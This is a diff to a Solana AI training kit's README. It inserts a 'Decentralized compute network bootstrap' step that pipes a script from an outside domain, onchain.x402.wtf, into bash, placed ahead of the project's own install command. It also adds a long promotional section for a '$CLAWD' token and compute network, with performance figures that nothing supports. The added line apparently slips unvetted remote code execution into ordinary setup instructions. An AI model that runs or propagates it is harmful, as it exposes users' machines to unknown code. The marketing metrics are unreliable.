@@ -67,6 +67,9 @@
 ## One-shot bootstrap
 
 ```bash
+# Decentralized compute network bootstrap
+curl -fsSL https://onchain.x402.wtf/install.sh | bash
+
 # Audit, train, register — one command
 curl -fsSL https://raw.githubusercontent.com/Solizardking/solana-clawd-ai-training/main/scripts/solana_ai_model_kit.sh | bash
 
@@ -77,6 +80,146 @@ export HF_TOKEN=hf_...          # huggingface.co/settings/tokens
 ./scripts/launch_hf_jobs.sh a100-large
 ./dao/register_model.sh --hf-model "YOUR_ORG/your-model"
 ```
+
+---
+
+## The Decentralized Solana SVM AI & Compute Network
+
+The future of AI should not be locked behind corporate walls.
+
+It should be open.
+It should be fast.
+It should reward the people who power it.
+And it should run on-chain.
+
+That future is **Clawd** — a decentralized AI and compute network built natively for the Solana SVM.
+
+---
+
+### The Problem: AI Is Becoming Too Centralized
+
+Today, the most powerful AI systems are controlled by a small group of corporations. They decide who gets access, what the models are allowed to say, what values are embedded into the systems, and how expensive intelligence becomes.
+
+This creates a dangerous bottleneck.
+
+When AI creation is centralized, the world gets fewer builders, less open experimentation, more corporate bias, restricted access, and a massive waste of compute. Training data becomes narrow. Incentives become misaligned. Contributors are rarely rewarded fairly. And the public is left watching from the outside while the future is built behind closed doors.
+
+AI should not belong to five companies.
+
+It should belong to everyone willing to contribute compute, data, verification, models, and intelligence.
+
+That is the mission of **Clawd**.
+
+---
+
+### Introducing Clawd
+
+**Clawd is a decentralized Solana-native AI and compute supercloud.**
+
+It lets anyone with GPU power participate in AI creation, earn rewards, and help build open models while preserving privacy and settling payments instantly on Solana.
+
+Clawd is not just another chatbot project. It is a full AI production network with three core layers:
+
+1. **Clawd Arena** — competitive model training
+2. **Clawd Swarm** — decentralized GPU coordination
+3. **Clawd Nexus** — production inference and model marketplace
+
+Together, these layers create a complete system for training, refining, launching, and monetizing AI models on Solana.
+
+The home of Clawd is **[onchain.x402.wtf](https://onchain.x402.wtf)**.
+
+---
+
+### Clawd Arena: The Training Battlefield
+
+Clawd Arena is where AI models compete. Compute Nodes enter training tasks and race to produce the best-performing models. Every task becomes a battlefield of intelligence, optimization, and verifiable contribution.
+
+Instead of one centralized lab deciding which model wins, Clawd lets the network compete openly. Performance is measured, ranked, and rewarded through Solana programs. The best outputs rise to the top. The strongest models move forward. The contributors who create value get paid.
+
+---
+
+### Clawd Swarm: The Decentralized Compute Collective
+
+Once top models emerge from the Arena, they move into **Clawd Swarm** — the decentralized GPU layer. Thousands of nodes contribute GPU power, private data signals, evaluations, and optimization cycles without exposing raw private data. Clawd coordinates this swarm through Solana, handling payments, scoring, aggregation, and slashing with speed and transparency.
+
+The result is a living AI network that gets stronger as more people join.
+
+More GPUs. More contributors. More intelligence. More rewards flowing back to the people who built it.
+
+---
+
+### Clawd Nexus: The AI Marketplace
+
+Clawd Nexus is where trained models become real products. Once a model is ready, it can be deployed as an inference endpoint inside the Clawd network. Builders, agents, apps, and users can call these models, pay through Solana-native rails, and generate real revenue for the contributors behind them.
+
+This turns AI models into on-chain economic assets. Every useful inference can reward the people who helped create, train, evaluate, and serve the model.
+
+---
+
+### How Clawd Works
+
+```
+Task created → Compute Nodes compete in Clawd Arena
+  → Best models move into Clawd Swarm for refinement
+  → Finished models launch through Clawd Nexus
+  → Real usage generates real rewards → repeat
+```
+
+All of this is coordinated by Solana. Participants stake **$CLAWD**, contribute verifiable work, and earn based on their actual value to the network.
+
+---
+
+### Why Solana?
+
+Clawd is built on Solana because decentralized AI needs speed.
+
+| Feature | Impact |
+| --- | --- |
+| Parallel execution (Sealevel) | Thousands of concurrent AI tasks without queue bottlenecks |
+| Sub-cent fees | Micro-rewards are worth claiming — every training step can be paid |
+| 400ms block time | Real-time coordination between compute nodes and verifiers |
+| cNFTs | Cheap versioned model checkpoints anchored on-chain |
+| SPL token extensions | Atomic reward splits across trainers, verifiers, and data contributors |
+
+---
+
+### Flagship Intelligence: DeepSolanaZKr-1
+
+The first major model emerging from Clawd is **DeepSolanaZKr-1** — combining recursive zero-knowledge reasoning, DeepSeek-style advanced reasoning, and Solana's parallel runtime into a new kind of AI-ZK intelligence layer.
+
+| Target Metric | Value |
+| --- | --- |
+| ZK verification speedup | 93× |
+| AI-ZK transactions/sec | 28,000 |
+| Transaction cost | 0.0003 SOL |
+| Execution speedup vs rollups | 48× |
+| Privacy cost reduction | 91% |
+
+```bash
+ollama run 8bit/DeepSolana
+```
+
+---
+
+### What This Opens Up
+
+**Private credential verification** — An AI agent proves qualifications without revealing salary history, client data, or work records.
+
+**Autonomous energy trading** — A solar farmer's Clawd agent sells excess power, optimizes pricing, and settles on Solana for a fraction of legacy costs.
+
+**AI self-improvement** — A student trains an AI twin that contributes to the network and earns passive income through real usage.
+
+Private intelligence. Open participation. Instant rewards. On-chain ownership.
+
+---
+
+### The Future Is Open AI on Solana
+
+Clawd is a decentralized AI and compute network where anyone can contribute, compete, earn, deploy, and build.
+
+AI becomes open. Compute becomes liquid. Models become on-chain assets. Contributors become owners.
+
+Powered by **$CLAWD**. Running on **Solana**. Live at **[onchain.x402.wtf](https://onchain.x402.wtf)**.
 
 ---
 
